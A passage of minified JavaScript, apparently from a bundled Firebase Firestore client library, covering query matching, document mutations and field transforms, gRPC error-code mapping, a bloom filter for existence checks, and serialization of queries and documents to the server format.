bE(r))if(!s.field.isKeyField()&&i.data.field(s.field)===null)return!1;return!0})(t,e)&&(function(r,i){for(const s of r.filters)if(!s.matches(i))return!1;return!0})(t,e)&&(function(r,i){return!(r.startAt&&!(function(o,a,c){const l=Rne(o,a,c);return o.inclusive?l<=0:l<0})(r.startAt,bE(r),i)||r.endAt&&!(function(o,a,c){const l=Rne(o,a,c);return o.inclusive?l>=0:l>0})(r.endAt,bE(r),i))})(t,e)}function kVe(t){return t.collectionGroup||(t.path.length%2==1?t.path.lastSegment():t.path.get(t.path.length-2))}function vfe(t){return(e,n)=>{let r=!1;for(const i of bE(t)){const s=DVe(i,e,n);if(s!==0)return s;r=r||i.field.isKeyField()}return 0}}function DVe(t,e,n){const r=t.field.isKeyField()?Pt.comparator(e.key,n.key):(function(s,o,a){const c=o.data.field(s),l=a.data.field(s);return c!==null&&l!==null?Q1(c,l):Ft(42886)})(t.field,e,n);switch(t.dir){case"asc":return r;case"desc":return-1*r;default:return Ft(19790,{direction:t.dir})}}class hy{constructor(e,n){this.mapKeyFn=e,this.equalsFn=n,this.inner={},this.innerSize=0}get(e){const n=this.mapKeyFn(e),r=this.inner[n];if(r!==void 0){for(const[i,s]of r)if(this.equalsFn(i,e))return s}}has(e){return this.get(e)!==void 0}set(e,n){const r=this.mapKeyFn(e),i=this.inner[r];if(i===void 0)return this.inner[r]=[[e,n]],void this.innerSize++;for(let s=0;s<i.length;s++)if(this.equalsFn(i[s][0],e))return void(i[s]=[e,n]);i.push([e,n]),this.innerSize++}delete(e){const n=this.mapKeyFn(e),r=this.inner[n];if(r===void 0)return!1;for(let i=0;i<r.length;i++)if(this.equalsFn(r[i][0],e))return r.length===1?delete this.inner[n]:r.splice(i,1),this.innerSize--,!0;return!1}forEach(e){fy(this.inner,((n,r)=>{for(const[i,s]of r)e(i,s)}))}isEmpty(){return rfe(this.inner)}size(){return this.innerSize}}const BVe=new Yr(Pt.comparator);function qf(){return BVe}const Efe=new Yr(Pt.comparator);function X2(...t){let e=Efe;for(const n of t)e=e.insert(n.key,n);return e}function _fe(t){let e=Efe;return t.forEach(((n,r)=>e=e.insert(n,r.overlayedDocument))),e}function Wm(){return wE()}function Afe(){return wE()}function wE(){return new hy((t=>t.toString()),((t,e)=>t.isEqual(e)))}const jVe=new Yr(Pt.comparator),MVe=new qi(Pt.comparator);function mn(...t){let e=MVe;for(const n of t)e=e.add(n);return e}const UVe=new qi(pn);function LVe(){return UVe}function GM(t,e){if(t.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:AI(e)?"-0":e}}function Cfe(t){return{integerValue:""+t}}function FVe(t,e){return hVe(e)?Cfe(e):GM(t,e)}class yR{constructor(){this._=void 0}}function $Ve(t,e,n){return t instanceof II?(function(i,s){const o={fields:{[ofe]:{stringValue:sfe},[cfe]:{timestampValue:{seconds:i.seconds,nanos:i.nanoseconds}}}};return s&&zM(s)&&(s=hR(s)),s&&(o.fields[afe]=s),{mapValue:o}})(n,e):t instanceof F_?Tfe(t,e):t instanceof $_?xfe(t,e):(function(i,s){const o=Sfe(i,s),a=kne(o)+kne(i.Ae);return BD(o)&&BD(i.Ae)?Cfe(a):GM(i.serializer,a)})(t,e)}function HVe(t,e,n){return t instanceof F_?Tfe(t,e):t instanceof $_?xfe(t,e):n}function Sfe(t,e){return t instanceof RI?(function(r){return BD(r)||(function(s){return!!s&&"doubleValue"in s})(r)})(e)?e:{integerValue:0}:null}class II extends yR{}class F_ extends yR{constructor(e){super(),this.elements=e}}function Tfe(t,e){const n=Ife(e);for(const r of t.elements)n.some((i=>rd(i,r)))||n.push(r);return{arrayValue:{values:n}}}class $_ extends yR{constructor(e){super(),this.elements=e}}function xfe(t,e){let n=Ife(e);for(const r of t.elements)n=n.filter((i=>!rd(i,r)));return{arrayValue:{values:n}}}class RI extends yR{constructor(e,n){super(),this.serializer=e,this.Ae=n}}function kne(t){return pi(t.integerValue||t.doubleValue)}function Ife(t){return qM(t)&&t.arrayValue.values?t.arrayValue.values.slice():[]}function zVe(t,e){return t.field.isEqual(e.field)&&(function(r,i){return r instanceof F_&&i instanceof F_||r instanceof $_&&i instanceof $_?Y1(r.elements,i.elements,rd):r instanceof RI&&i instanceof RI?rd(r.Ae,i.Ae):r instanceof II&&i instanceof II})(t.transform,e.transform)}class qVe{constructor(e,n){this.version=e,this.transformResults=n}}class xf{constructor(e,n){this.updateTime=e,this.exists=n}static none(){return new xf}static exists(e){return new xf(void 0,e)}static updateTime(e){return new xf(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function rx(t,e){return t.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(t.updateTime):t.exists===void 0||t.exists===e.isFoundDocument()}class bR{}function Rfe(t,e){if(!t.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return t.isNoDocument()?new Nfe(t.key,xf.none()):new s5(t.key,t.data,xf.none());{const n=t.data,r=Bc.empty();let i=new qi(Ts.comparator);for(let s of e.fields)if(!i.has(s)){let o=n.field(s);o===null&&s.length>1&&(s=s.popLast(),o=n.field(s)),o===null?r.delete(s):r.set(s,o),i=i.add(s)}return new py(t.key,r,new Du(i.toArray()),xf.none())}}function VVe(t,e,n){t instanceof s5?(function(i,s,o){const a=i.value.clone(),c=Bne(i.fieldTransforms,s,o.transformResults);a.setAll(c),s.convertToFoundDocument(o.version,a).setHasCommittedMutations()})(t,e,n):t instanceof py?(function(i,s,o){if(!rx(i.precondition,s))return void s.convertToUnknownDocument(o.version);const a=Bne(i.fieldTransforms,s,o.transformResults),c=s.data;c.setAll(Pfe(i)),c.setAll(a),s.convertToFoundDocument(o.version,c).setHasCommittedMutations()})(t,e,n):(function(i,s,o){s.convertToNoDocument(o.version).setHasCommittedMutations()})(0,e,n)}function vE(t,e,n,r){return t instanceof s5?(function(s,o,a,c){if(!rx(s.precondition,o))return a;const l=s.value.clone(),f=jne(s.fieldTransforms,c,o);return l.setAll(f),o.convertToFoundDocument(o.version,l).setHasLocalMutations(),null})(t,e,n,r):t instanceof py?(function(s,o,a,c){if(!rx(s.precondition,o))return a;const l=jne(s.fieldTransforms,c,o),f=o.data;return f.setAll(Pfe(s)),f.setAll(l),o.convertToFoundDocument(o.version,f).setHasLocalMutations(),a===null?null:a.unionWith(s.fieldMask.fields).unionWith(s.fieldTransforms.map((h=>h.field)))})(t,e,n,r):(function(s,o,a){return rx(s.precondition,o)?(o.convertToNoDocument(o.version).setHasLocalMutations(),null):a})(t,e,n)}function WVe(t,e){let n=null;for(const r of t.fieldTransforms){const i=e.data.field(r.field),s=Sfe(r.transform,i||null);s!=null&&(n===null&&(n=Bc.empty()),n.set(r.field,s))}return n||null}function Dne(t,e){return t.type===e.type&&!!t.key.isEqual(e.key)&&!!t.precondition.isEqual(e.precondition)&&!!(function(r,i){return r===void 0&&i===void 0||!(!r||!i)&&Y1(r,i,((s,o)=>zVe(s,o)))})(t.fieldTransforms,e.fieldTransforms)&&(t.type===0?t.value.isEqual(e.value):t.type!==1||t.data.isEqual(e.data)&&t.fieldMask.isEqual(e.fieldMask))}class s5 extends bR{constructor(e,n,r,i=[]){super(),this.key=e,this.value=n,this.precondition=r,this.fieldTransforms=i,this.type=0}getFieldMask(){return null}}class py extends bR{constructor(e,n,r,i,s=[]){super(),this.key=e,this.data=n,this.fieldMask=r,this.precondition=i,this.fieldTransforms=s,this.type=1}getFieldMask(){return this.fieldMask}}function Pfe(t){const e=new Map;return t.fieldMask.fields.forEach((n=>{if(!n.isEmpty()){const r=t.data.field(n);e.set(n,r)}})),e}function Bne(t,e,n){const r=new Map;Kn(t.length===n.length,32656,{Re:n.length,Ve:t.length});for(let i=0;i<n.length;i++){const s=t[i],o=s.transform,a=e.data.field(s.field);r.set(s.field,HVe(o,a,n[i]))}return r}function jne(t,e,n){const r=new Map;for(const i of t){const s=i.transform,o=n.data.field(i.field);r.set(i.field,$Ve(s,o,e))}return r}class Nfe extends bR{constructor(e,n){super(),this.key=e,this.precondition=n,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class GVe extends bR{constructor(e,n){super(),this.key=e,this.precondition=n,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}class KVe{constructor(e,n,r,i){this.batchId=e,this.localWriteTime=n,this.baseMutations=r,this.mutations=i}applyToRemoteDocument(e,n){const r=n.mutationResults;for(let i=0;i<this.mutations.length;i++){const s=this.mutations[i];s.key.isEqual(e.key)&&VVe(s,e,r[i])}}applyToLocalView(e,n){for(const r of this.baseMutations)r.key.isEqual(e.key)&&(n=vE(r,e,n,this.localWriteTime));for(const r of this.mutations)r.key.isEqual(e.key)&&(n=vE(r,e,n,this.localWriteTime));return n}applyToLocalDocumentSet(e,n){const r=Afe();return this.mutations.forEach((i=>{const s=e.get(i.key),o=s.overlayedDocument;let a=this.applyToLocalView(o,s.mutatedFields);a=n.has(i.key)?null:a;const c=Rfe(o,a);c!==null&&r.set(i.key,c),o.isValidDocument()||o.convertToNoDocument(qt.min())})),r}keys(){return this.mutations.reduce(((e,n)=>e.add(n.key)),mn())}isEqual(e){return this.batchId===e.batchId&&Y1(this.mutations,e.mutations,((n,r)=>Dne(n,r)))&&Y1(this.baseMutations,e.baseMutations,((n,r)=>Dne(n,r)))}}class KM{constructor(e,n,r,i){this.batch=e,this.commitVersion=n,this.mutationResults=r,this.docVersions=i}static from(e,n,r){Kn(e.mutations.length===r.length,58842,{me:e.mutations.length,fe:r.length});let i=(function(){return jVe})();const s=e.mutations;for(let o=0;o<s.length;o++)i=i.insert(s[o].key,r[o].version);return new KM(e,n,r,i)}}class ZVe{constructor(e,n){this.largestBatchId=e,this.mutation=n}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}}class YVe{constructor(e,n){this.count=e,this.unchangedNames=n}}var xi,Sn;function QVe(t){switch(t){case Fe.OK:return Ft(64938);case Fe.CANCELLED:case Fe.UNKNOWN:case Fe.DEADLINE_EXCEEDED:case Fe.RESOURCE_EXHAUSTED:case Fe.INTERNAL:case Fe.UNAVAILABLE:case Fe.UNAUTHENTICATED:return!1;case Fe.INVALID_ARGUMENT:case Fe.NOT_FOUND:case Fe.ALREADY_EXISTS:case Fe.PERMISSION_DENIED:case Fe.FAILED_PRECONDITION:case Fe.ABORTED:case Fe.OUT_OF_RANGE:case Fe.UNIMPLEMENTED:case Fe.DATA_LOSS:return!0;default:return Ft(15467,{code:t})}}function Ofe(t){if(t===void 0)return zf("GRPC error has no .code"),Fe.UNKNOWN;switch(t){case xi.OK:return Fe.OK;case xi.CANCELLED:return Fe.CANCELLED;case xi.UNKNOWN:return Fe.UNKNOWN;case xi.DEADLINE_EXCEEDED:return Fe.DEADLINE_EXCEEDED;case xi.RESOURCE_EXHAUSTED:return Fe.RESOURCE_EXHAUSTED;case xi.INTERNAL:return Fe.INTERNAL;case xi.UNAVAILABLE:return Fe.UNAVAILABLE;case xi.UNAUTHENTICATED:return Fe.UNAUTHENTICATED;case xi.INVALID_ARGUMENT:return Fe.INVALID_ARGUMENT;case xi.NOT_FOUND:return Fe.NOT_FOUND;case xi.ALREADY_EXISTS:return Fe.ALREADY_EXISTS;case xi.PERMISSION_DENIED:return Fe.PERMISSION_DENIED;case xi.FAILED_PRECONDITION:return Fe.FAILED_PRECONDITION;case xi.ABORTED:return Fe.ABORTED;case xi.OUT_OF_RANGE:return Fe.OUT_OF_RANGE;case xi.UNIMPLEMENTED:return Fe.UNIMPLEMENTED;case xi.DATA_LOSS:return Fe.DATA_LOSS;default:return Ft(39323,{code:t})}}(Sn=xi||(xi={}))[Sn.OK=0]="OK",Sn[Sn.CANCELLED=1]="CANCELLED",Sn[Sn.UNKNOWN=2]="UNKNOWN",Sn[Sn.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",Sn[Sn.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",Sn[Sn.NOT_FOUND=5]="NOT_FOUND",Sn[Sn.ALREADY_EXISTS=6]="ALREADY_EXISTS",Sn[Sn.PERMISSION_DENIED=7]="PERMISSION_DENIED",Sn[Sn.UNAUTHENTICATED=16]="UNAUTHENTICATED",Sn[Sn.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",Sn[Sn.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",Sn[Sn.ABORTED=10]="ABORTED",Sn[Sn.OUT_OF_RANGE=11]="OUT_OF_RANGE",Sn[Sn.UNIMPLEMENTED=12]="UNIMPLEMENTED",Sn[Sn.INTERNAL=13]="INTERNAL",Sn[Sn.UNAVAILABLE=14]="UNAVAILABLE",Sn[Sn.DATA_LOSS=15]="DATA_LOSS";function JVe(){return new TextEncoder}const XVe=new Ap([4294967295,4294967295],0);function Mne(t){const e=JVe().encode(t),n=new Wde;return n.update(e),new Uint8Array(n.digest())}function Une(t){const e=new DataView(t.buffer),n=e.getUint32(0,!0),r=e.getUint32(4,!0),i=e.getUint32(8,!0),s=e.getUint32(12,!0);return[new Ap([n,r],0),new Ap([i,s],0)]}class ZM{constructor(e,n,r){if(this.bitmap=e,this.padding=n,this.hashCount=r,n<0||n>=8)throw new eE(`Invalid padding: ${n}`);if(r<0)throw new eE(`Invalid hash count: ${r}`);if(e.length>0&&this.hashCount===0)throw new eE(`Invalid hash count: ${r}`);if(e.length===0&&n!==0)throw new eE(`Invalid padding when bitmap length is 0: ${n}`);this.ge=8*e.length-n,this.pe=Ap.fromNumber(this.ge)}ye(e,n,r){let i=e.add(n.multiply(Ap.fromNumber(r)));return i.compare(XVe)===1&&(i=new Ap([i.getBits(0),i.getBits(1)],0)),i.modulo(this.pe).toNumber()}we(e){return!!(this.bitmap[Math.floor(e/8)]&1<<e%8)}mightContain(e){if(this.ge===0)return!1;const n=Mne(e),[r,i]=Une(n);for(let s=0;s<this.hashCount;s++){const o=this.ye(r,i,s);if(!this.we(o))return!1}return!0}static create(e,n,r){const i=e%8==0?0:8-e%8,s=new Uint8Array(Math.ceil(e/8)),o=new ZM(s,i,n);return r.forEach((a=>o.insert(a))),o}insert(e){if(this.ge===0)return;const n=Mne(e),[r,i]=Une(n);for(let s=0;s<this.hashCount;s++){const o=this.ye(r,i,s);this.Se(o)}}Se(e){const n=Math.floor(e/8),r=e%8;this.bitmap[n]|=1<<r}}class eE extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}}class wR{constructor(e,n,r,i,s){this.snapshotVersion=e,this.targetChanges=n,this.targetMismatches=r,this.documentUpdates=i,this.resolvedLimboDocuments=s}static createSynthesizedRemoteEventForCurrentChange(e,n,r){const i=new Map;return i.set(e,o5.createSynthesizedTargetChangeForCurrentChange(e,n,r)),new wR(qt.min(),i,new Yr(pn),qf(),mn())}}class o5{constructor(e,n,r,i,s){this.resumeToken=e,this.current=n,this.addedDocuments=r,this.modifiedDocuments=i,this.removedDocuments=s}static createSynthesizedTargetChangeForCurrentChange(e,n,r){return new o5(r,n,mn(),mn(),mn())}}class ix{constructor(e,n,r,i){this.be=e,this.removedTargetIds=n,this.key=r,this.De=i}}class kfe{constructor(e,n){this.targetId=e,this.Ce=n}}class Dfe{constructor(e,n,r=xs.EMPTY_BYTE_STRING,i=null){this.state=e,this.targetIds=n,this.resumeToken=r,this.cause=i}}class Lne{constructor(){this.ve=0,this.Fe=Fne(),this.Me=xs.EMPTY_BYTE_STRING,this.xe=!1,this.Oe=!0}get current(){return this.xe}get resumeToken(){return this.Me}get Ne(){return this.ve!==0}get Be(){return this.Oe}Le(e){e.approximateByteSize()>0&&(this.Oe=!0,this.Me=e)}ke(){let e=mn(),n=mn(),r=mn();return this.Fe.forEach(((i,s)=>{switch(s){case 0:e=e.add(i);break;case 2:n=n.add(i);break;case 1:r=r.add(i);break;default:Ft(38017,{changeType:s})}})),new o5(this.Me,this.xe,e,n,r)}qe(){this.Oe=!1,this.Fe=Fne()}Qe(e,n){this.Oe=!0,this.Fe=this.Fe.insert(e,n)}$e(e){this.Oe=!0,this.Fe=this.Fe.remove(e)}Ue(){this.ve+=1}Ke(){this.ve-=1,Kn(this.ve>=0,3241,{ve:this.ve})}We(){this.Oe=!0,this.xe=!0}}class eWe{constructor(e){this.Ge=e,this.ze=new Map,this.je=qf(),this.Je=OT(),this.He=OT(),this.Ye=new Yr(pn)}Ze(e){for(const n of e.be)e.De&&e.De.isFoundDocument()?this.Xe(n,e.De):this.et(n,e.key,e.De);for(const n of e.removedTargetIds)this.et(n,e.key,e.De)}tt(e){this.forEachTarget(e,(n=>{const r=this.nt(n);switch(e.state){case 0:this.rt(n)&&r.Le(e.resumeToken);break;case 1:r.Ke(),r.Ne||r.qe(),r.Le(e.resumeToken);break;case 2:r.Ke(),r.Ne||this.removeTarget(n);break;case 3:this.rt(n)&&(r.We(),r.Le(e.resumeToken));break;case 4:this.rt(n)&&(this.it(n),r.Le(e.resumeToken));break;default:Ft(56790,{state:e.state})}}))}forEachTarget(e,n){e.targetIds.length>0?e.targetIds.forEach(n):this.ze.forEach(((r,i)=>{this.rt(i)&&n(i)}))}st(e){const n=e.targetId,r=e.Ce.count,i=this.ot(n);if(i){const s=i.target;if(MD(s))if(r===0){const o=new Pt(s.path);this.et(n,o,Gs.newNoDocument(o,qt.min()))}else Kn(r===1,20013,{expectedCount:r});else{const o=this._t(n);if(o!==r){const a=this.ut(e),c=a?this.ct(a,e,o):1;if(c!==0){this.it(n);const l=c===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Ye=this.Ye.insert(n,l)}}}}}ut(e){const n=e.Ce.unchangedNames;if(!n||!n.bits)return null;const{bits:{bitmap:r="",padding:i=0},hashCount:s=0}=n;let o,a;try{o=Hp(r).toUint8Array()}catch(c){if(c instanceof ife)return Z1("Decoding the base64 bloom filter in existence filter failed ("+c.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw c}try{a=new ZM(o,i,s)}catch(c){return Z1(c instanceof eE?"BloomFilter error: ":"Applying bloom filter failed: ",c),null}return a.ge===0?null:a}ct(e,n,r){return n.Ce.count===r-this.Pt(e,n.targetId)?0:2}Pt(e,n){const r=this.Ge.getRemoteKeysForTarget(n);let i=0;return r.forEach((s=>{const o=this.Ge.ht(),a=`projects/${o.projectId}/databases/${o.database}/documents/${s.path.canonicalString()}`;e.mightContain(a)||(this.et(n,s,null),i++)})),i}Tt(e){const n=new Map;this.ze.forEach(((s,o)=>{const a=this.ot(o);if(a){if(s.current&&MD(a.target)){const c=new Pt(a.target.path);this.It(c).has(o)||this.Et(o,c)||this.et(o,c,Gs.newNoDocument(c,e))}s.Be&&(n.set(o,s.ke()),s.qe())}}));let r=mn();this.He.forEach(((s,o)=>{let a=!0;o.forEachWhile((c=>{const l=this.ot(c);return!l||l.purpose==="TargetPurposeLimboResolution"||(a=!1,!1)})),a&&(r=r.add(s))})),this.je.forEach(((s,o)=>o.setReadTime(e)));const i=new wR(e,n,this.Ye,this.je,r);return this.je=qf(),this.Je=OT(),this.He=OT(),this.Ye=new Yr(pn),i}Xe(e,n){if(!this.rt(e))return;const r=this.Et(e,n.key)?2:0;this.nt(e).Qe(n.key,r),this.je=this.je.insert(n.key,n),this.Je=this.Je.insert(n.key,this.It(n.key).add(e)),this.He=this.He.insert(n.key,this.dt(n.key).add(e))}et(e,n,r){if(!this.rt(e))return;const i=this.nt(e);this.Et(e,n)?i.Qe(n,1):i.$e(n),this.He=this.He.insert(n,this.dt(n).delete(e)),this.He=this.He.insert(n,this.dt(n).add(e)),r&&(this.je=this.je.insert(n,r))}removeTarget(e){this.ze.delete(e)}_t(e){const n=this.nt(e).ke();return this.Ge.getRemoteKeysForTarget(e).size+n.addedDocuments.size-n.removedDocuments.size}Ue(e){this.nt(e).Ue()}nt(e){let n=this.ze.get(e);return n||(n=new Lne,this.ze.set(e,n)),n}dt(e){let n=this.He.get(e);return n||(n=new qi(pn),this.He=this.He.insert(e,n)),n}It(e){let n=this.Je.get(e);return n||(n=new qi(pn),this.Je=this.Je.insert(e,n)),n}rt(e){const n=this.ot(e)!==null;return n||mt("WatchChangeAggregator","Detected inactive target",e),n}ot(e){const n=this.ze.get(e);return n&&n.Ne?null:this.Ge.At(e)}it(e){this.ze.set(e,new Lne),this.Ge.getRemoteKeysForTarget(e).forEach((n=>{this.et(e,n,null)}))}Et(e,n){return this.Ge.getRemoteKeysForTarget(e).has(n)}}function OT(){return new Yr(Pt.comparator)}function Fne(){return new Yr(Pt.comparator)}const tWe={asc:"ASCENDING",desc:"DESCENDING"},nWe={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},rWe={and:"AND",or:"OR"};class iWe{constructor(e,n){this.databaseId=e,this.useProto3Json=n}}function FD(t,e){return t.useProto3Json||fR(e)?e:{value:e}}function PI(t,e){return t.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function Bfe(t,e){return t.useProto3Json?e.toBase64():e.toUint8Array()}function sWe(t,e){return PI(t,e.toTimestamp())}function ql(t){return Kn(!!t,49232),qt.fromTimestamp((function(n){const r=$p(n);return new kr(r.seconds,r.nanos)})(t))}function YM(t,e){return $D(t,e).canonicalString()}function $D(t,e){const n=(function(i){return new Sr(["projects",i.projectId,"databases",i.database])})(t).child("documents");return e===void 0?n:n.child(e)}function jfe(t){const e=Sr.fromString(t);return Kn($fe(e),10190,{key:e.toString()}),e}function HD(t,e){return YM(t.databaseId,e.path)}function Ek(t,e){const n=jfe(e);if(n.get(1)!==t.databaseId.projectId)throw new ut(Fe.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+n.get(1)+" vs "+t.databaseId.projectId);if(n.get(3)!==t.databaseId.database)throw new ut(Fe.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+n.get(3)+" vs "+t.databaseId.database);return new Pt(Ufe(n))}function Mfe(t,e){return YM(t.databaseId,e)}function oWe(t){const e=jfe(t);return e.length===4?Sr.emptyPath():Ufe(e)}function zD(t){return new Sr(["projects",t.databaseId.projectId,"databases",t.databaseId.database]).canonicalString()}function Ufe(t){return Kn(t.length>4&&t.get(4)==="documents",29091,{key:t.toString()}),t.popFirst(5)}function $ne(t,e,n){return{name:HD(t,e),fields:n.value.mapValue.fields}}function aWe(t,e){let n;if("targetChange"in e){e.targetChange;const r=(function(l){return l==="NO_CHANGE"?0:l==="ADD"?1:l==="REMOVE"?2:l==="CURRENT"?3:l==="RESET"?4:Ft(39313,{state:l})})(e.targetChange.targetChangeType||"NO_CHANGE"),i=e.targetChange.targetIds||[],s=(function(l,f){return l.useProto3Json?(Kn(f===void 0||typeof f=="string",58123),xs.fromBase64String(f||"")):(Kn(f===void 0||f instanceof Buffer||f instanceof Uint8Array,16193),xs.fromUint8Array(f||new Uint8Array))})(t,e.targetChange.resumeToken),o=e.targetChange.cause,a=o&&(function(l){const f=l.code===void 0?Fe.UNKNOWN:Ofe(l.code);return new ut(f,l.message||"")})(o);n=new Dfe(r,i,s,a||null)}else if("documentChange"in e){e.documentChange;const r=e.documentChange;r.document,r.document.name,r.document.updateTime;const i=Ek(t,r.document.name),s=ql(r.document.updateTime),o=r.document.createTime?ql(r.document.createTime):qt.min(),a=new Bc({mapValue:{fields:r.document.fields}}),c=Gs.newFoundDocument(i,s,o,a),l=r.targetIds||[],f=r.removedTargetIds||[];n=new ix(l,f,c.key,c)}else if("documentDelete"in e){e.documentDelete;const r=e.documentDelete;r.document;const i=Ek(t,r.document),s=r.readTime?ql(r.readTime):qt.min(),o=Gs.newNoDocument(i,s),a=r.removedTargetIds||[];n=new ix([],a,o.key,o)}else if("documentRemove"in e){e.documentRemove;const r=e.documentRemove;r.document;const i=Ek(t,r.document),s=r.removedTargetIds||[];n=new ix([],s,i,null)}else{if(!("filter"in e))return Ft(11601,{Rt:e});{e.filter;const r=e.filter;r.targetId;const{count:i=0,unchangedNames:s}=r,o=new YVe(i,s),a=r.targetId;n=new kfe(a,o)}}return n}function cWe(t,e){let n;if(e instanceof s5)n={update:$ne(t,e.key,e.value)};else if(e instanceof Nfe)n={delete:HD(t,e.key)};else if(e instanceof py)n={update:$ne(t,e.key,e.data),updateMask:yWe(e.fieldMask)};else{if(!(e instanceof GVe))return Ft(16599,{Vt:e.type});n={verify:HD(t,e.key)}}return e.fieldTransforms.length>0&&(n.updateTransforms=e.fieldTransforms.map((r=>(function(s,o){const a=o.transform;if(a instanceof II)return{fieldPath:o.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(a instanceof F_)return{fieldPath:o.field.canonicalString(),appendMissingElements:{values:a.elements}};if(a instanceof $_)return{fieldPath:o.field.canonicalString(),removeAllFromArray:{values:a.elements}};if(a instanceof RI)return{fieldPath:o.field.canonicalString(),increment:a.Ae};throw Ft(20930,{transform:o.transform})})(0,r)))),e.precondition.isNone||(n.currentDocument=(function(i,s){return s.updateTime!==void 0?{updateTime:sWe(i,s.updateTime)}:s.exists!==void 0?{exists:s.exists}:Ft(27497)})(t,e.precondition)),n}function uWe(t,e){return t&&t.length>0?(Kn(e!==void 0,14353),t.map((n=>(function(i,s){let o=i.updateTime?ql(i.updateTime):ql(s);return o.isEqual(qt.min())&&(o=ql(s)),new qVe(o,i.transformResults||[])})(n,e)))):[]}function lWe(t,e){return{documents:[Mfe(t,e.path)]}}function dWe(t,e){const n={structuredQuery:{}},r=e.path;let i;e.collectionGroup!==null?(i=r,n.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(i=r.popLast(),n.structuredQuery.from=[{collectionId:r.lastSegment()}]),n.parent=Mfe(t,i);const s=(function(l){if(l.length!==0)return Ffe($u.create(l,"and"))})(e.filters);s&&(n.structuredQuery.where=s);const o=(function(l){if(l.length!==0)return l.map((f=>(function(m){return{field:Fb(m.field),direction:pWe(m.dir)}})(f)))})(e.orderBy);o&&(n.structuredQuery.orderBy=o);const a=FD(t,e.limit);return a!==null&&(n.structuredQuery.limit=a),e.startAt&&(n.structuredQuery.startAt=(function(l){return{before:l.inclusive,values:l.position}})(e.startAt)),e.endAt&&(n.structuredQuery.endAt=(function(l){return{before:!l.inclusive,values:l.position}})(e.endAt)),{ft:n,parent:i}}function fWe(t){let e=oWe(t.parent);const n=t.structuredQuery,r=n.from?n.from.length:0;let i=null;if(r>0){Kn(r===1,65062);const f=n.from[0];f.allDescendants?i=f.collectionId:e=e.child(f.collectionId)}let s=[];n.where&&(s=(function(h){const m=Lfe(h);return m instanceof $u&&pfe(m)?m.getFilters():[m]})(n.where));let o=[];n.orderBy&&(o=(function(h){return h.map((m=>(function(w){return new xI($b(w.field),(function(E){switch(E){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}})(w.direction))})(m)))})(n.orderBy));let a=null;n.limit&&(a=(function(h){let m;return m=typeof h=="object"?h.value:h,fR(m)?null:m})(n.limit));let c=null;n.startAt&&(c=(function(h){const m=!!h.before,b=h.values||[];return new TI(b,m)})(n.startAt));let l=null;return n.endAt&&(l=(function(h){const m=!h.before,b=h.values||[];return new TI(b,m)})(n.endAt)),NVe(e,i,o,s,a,"F",c,l)}function hWe(t,e){const n=(function(i){switch(i){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return Ft(28987,{purpose:i})}})(e.purpose);return n==null?null:{"goog-listen-tags":n}}function Lfe(t){return t.unaryFilter!==void 0?(function(n){switch(n.unaryFilter.op){case"IS_NAN":const r=$b(n.unaryFilter.field);return ki.create(r,"==",{doubleValue:NaN});case"IS_NULL":const i=$b(n.unaryFilter.field);return ki.create(i,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const s=$b(n.unaryFilter.field);return ki.create(s,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const o=$b(n.unaryFilter.field);return ki.create(o,"!=",{nullValue:"NULL_VALUE"});case"OPERATOR_UNSPECIFIED":return Ft(61313);default:return Ft(60726)}})(t):t.fieldFilter!==void 0?(function(n){return ki.create($b(n.fieldFilter.field),(function(i){switch(i){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";case"OPERATOR_UNSPECIFIED":return Ft(58110);default:return Ft(50506)}})(n.fieldFilter.op),n.fieldFilter.value)})(t):t.compositeFilter!==void 0?(function(n){return $u.create(n.compositeFilter.filters.map((r=>Lfe(r))),(function(i){switch(i){case"AND":return"and";case"OR":return"or";default:return Ft(1026)}})(n.compositeFilter.op))})(t):Ft(30097,{filter:t})}function pWe(t){return tWe[t]}function mWe(t){return nWe[t]}function gWe(t){return rWe[t]}function Fb(t){return{fieldPath:t.canonicalString()}}function $b(t){return Ts.fromServerFormat(t.fieldPath)}function Ffe(t){return t instanceof 